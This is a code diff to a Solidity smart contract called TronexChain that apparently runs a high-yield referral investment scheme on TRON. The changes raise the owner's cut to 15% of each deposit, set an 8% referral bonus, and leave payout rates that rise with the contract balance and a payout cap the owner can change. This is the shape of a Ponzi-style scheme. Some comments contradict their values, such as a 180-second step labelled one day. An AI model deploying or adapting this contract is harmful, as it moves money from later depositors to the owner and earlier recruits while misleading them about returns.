@@ -23,11 +23,13 @@ contract TronexChain {
 	uint256 public max_receivable  = 0;
 
     uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 1000000 trx
-    uint256 constant public MIN_DEPOSIT = 50 trx; // 50 trx
+    uint256 constant public MIN_DEPOSIT = 10 trx; // 50 trx
     uint256 constant public BASE_PERCENT = 120 ; // 0.1% => 1 unit, 1.2% daily (MULTIPLIER 100)
-	uint256 constant public PERCENT_DIVIDER = 10000; 
+	uint256 constant public PERCENTS_DIVIDER = 10000; 
     uint256 constant public TIME_STEP = 180 ; // 1 days
+    uint256 constant public aff_bonus = 8 ; // 8 percent
  	uint256 public team_levels = 30;
+    uint256 public fee  = 15;   
 
  // for 10 mil - 0.2 % increase | 1 mil - 0.02 % 
  // for 50 mil - 1 % total
@@ -71,7 +73,7 @@ contract TronexChain {
  
     function _setUpline(address _addr, address _upline) private {
         if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && 
-		(users[_upline].deposit_time > 0 || _upline == owner)) {
+		(users[_upline].deposit_time > 0 || _upline == owner) ) {
             users[_addr].upline = _upline;
             users[_upline].referrals++;
 
@@ -98,7 +100,7 @@ contract TronexChain {
             require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
             require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
         }
-        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");
+        else require(_amount >= MIN_DEPOSIT && _amount <= cycles[0], "Bad amount");
         
         users[_addr].payouts = 0;
         users[_addr].deposit_amount = _amount;
@@ -121,13 +123,12 @@ contract TronexChain {
             }
 
         if(users[_addr].upline != address(0)) {
-            users[users[_addr].upline].direct_bonus += _amount / 10;
+            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;
 
-            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
+            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);
         } 
          
-        owner.transfer(_amount / 50);
-        owner.transfer(_amount * 3 / 100);
+         owner.transfer(_amount * fee / 100);
         
     }
      function _refPayout(address _addr, uint256 _amount) private {
@@ -210,6 +211,118 @@ contract TronexChain {
         }
     }
     
+    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
+        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
+		uint256 total_rate = getTotalRate();
+
+        if(users[_addr].deposit_payouts < max_payout) {
+            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
+            if(users[_addr].deposit_payouts + payout > max_payout) {
+                payout = max_payout - users[_addr].deposit_payouts;
+            }
+        }
+    }
+
+    function getUserDividends(address _addr) view external returns(uint256) {
+      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
+        uint256 total_rate = getTotalRate();
+            uint256 payout;
+        if(users[_addr].deposit_payouts < max_payout) {
+            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
+            if(users[_addr].deposit_payouts + payout > max_payout) {
+                payout = max_payout - users[_addr].deposit_payouts;
+            }
+        }
+        return payout;
+    }   
+ 
+	function getTotalRate() internal view returns(uint256) {
+	 
+		uint256 contract_balance = address(this).balance;
+		uint256 step1 = 0;
+		uint256 step2 = 0;
+		uint256 steps =  contract_balance/CONTRACT_BALANCE_STEP ;
+
+         if(steps <= 50){
+             step1 = steps*2;
+             step2 = 0; 
+         } else {
+             step1 = 100;
+             step2 = steps - step1;
+         }
+         uint256 total_step = step1 + step2;
+
+		return BASE_PERCENT+total_step ;
+	}
+
+    /*
+        Only external call
+    */
+
+
+	function getContractBalance() public view returns (uint256) {
+		return address(this).balance;
+	} 
+
+    function getTotalSteps( uint256 _balance) external view returns(uint256) {
+     
+        uint256 step1 = 0;
+        uint256 step2 = 0;
+        uint256 balance_trx = _balance*1000000; 
+        uint256 steps =  balance_trx/CONTRACT_BALANCE_STEP ;
+
+         if(steps <= 50){
+             step1 = steps*2;
+             step2 = 0; 
+         } else {
+             step1 = 100;
+             step2 = steps - step1;
+         }
+         uint256 total_step = step1 + step2;
+ 
+        return total_step ;
+    }
+
+
+	function getRate() external view returns(uint256) {
+	 
+		uint256 contract_balance = address(this).balance;
+        uint256 step1 = 0;
+        uint256 step2 = 0;
+        uint256 steps =  contract_balance/CONTRACT_BALANCE_STEP ;
+
+         if(steps <= 50){
+             step1 = steps*2;
+             step2 = 0; 
+         } else {
+             step1 = 100;
+             step2 = steps - step1;
+         }
+         uint256 total_step = step1 + step2;
+         
+        return BASE_PERCENT+total_step ;
+	}
+
+    function getContractBonus() external view returns(uint256) {
+     
+        uint256 contract_balance = address(this).balance;
+        uint256 step1 = 0;
+        uint256 step2 = 0;
+        uint256 steps = contract_balance/CONTRACT_BALANCE_STEP ;
+
+         if(steps <= 50){
+             step1 = steps;
+             step2 = 0; 
+         } else {
+             step1 = 50;
+             step2 = steps/2 - step1;
+         }
+         uint256 total_step = step1 + step2;
+ 
+        return total_step ;
+    }
+
+
     function maxPayoutOf(uint256 _amount) external view returns(uint256) {
 		if(max_receivable > 0){
 			return  _amount * max_receivable / 100;
@@ -218,45 +331,45 @@ contract TronexChain {
 		}
     }
  
-    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
-        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
-		uint256 total_rate = getTotalRate();
 
-        if(users[_addr].deposit_payouts < max_payout) {
-            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENT_DIVIDER) - users[_addr].deposit_payouts;
-            
-            if(users[_addr].deposit_payouts + payout > max_payout) {
-                payout = max_payout - users[_addr].deposit_payouts;
-            }
-        }
-    }
+	function getUserBalance(address _addr) external view returns (uint256) {
+        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); 
  
-	function getTotalRate() internal view returns(uint256) {
-	 
-		uint256 contract_balance = address(this).balance;
-		uint256 step1 = 0;
-		uint256 step2 = 0;
-		uint256 steps = contract_balance/CONTRACT_BALANCE_STEP ;
+        // Deposit payout
+        if(to_payout > 0) {
+            if(users[_addr].payouts + to_payout > max_payout) {
+                to_payout = max_payout - users[_addr].payouts;
+            } 
+         }
+        
+        // Direct payout
+        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {
+            uint256 direct_bonus = users[_addr].direct_bonus;
 
-		 if(steps <= 50){
-			 step1 = steps;
-			 step2 = 0; 
+            if(users[_addr].payouts + direct_bonus > max_payout) {
+                direct_bonus = max_payout - users[_addr].payouts;
+            } 
+           
+            to_payout += direct_bonus;
+        } 
+       
+        // Match payout
+        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {
+            uint256 gen_bonus = users[_addr].gen_bonus;
+
+            if(users[_addr].payouts + gen_bonus > max_payout) {
+                gen_bonus = max_payout - users[_addr].payouts;
+            } 
+            to_payout += gen_bonus;
+        } 
+ 
+        if(users[_addr].payouts >= max_payout) {
+			return 0;       
 		 } else {
-			 step1 = 50;
-			 step2 = steps/2 - step1;
+			 return to_payout;
 		 }
-		 uint256 total_step = step1 + step2;
- 
-		return BASE_PERCENT+total_step ;
-	}
-
-	function getContractBalance() public view returns (uint256) {
-		return address(this).balance;
-	} 
-    /*
-        Only external call
-    */
-
+    }
+  
 	function changeMaxRec(uint256 _maxRecPercent) public {
 		require(msg.sender == owner || msg.sender == alt_owner, "Not allowed");
 		max_receivable = _maxRecPercent;
@@ -272,8 +385,12 @@ contract TronexChain {
 		owner = _newAdmin;
 	} 
 
-    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus) {
-        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus);
+    function getAdmin() external view returns (address){
+         
+        return owner;
+    } 
+    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus ) {
+        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus );
     }
 
     function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz) {
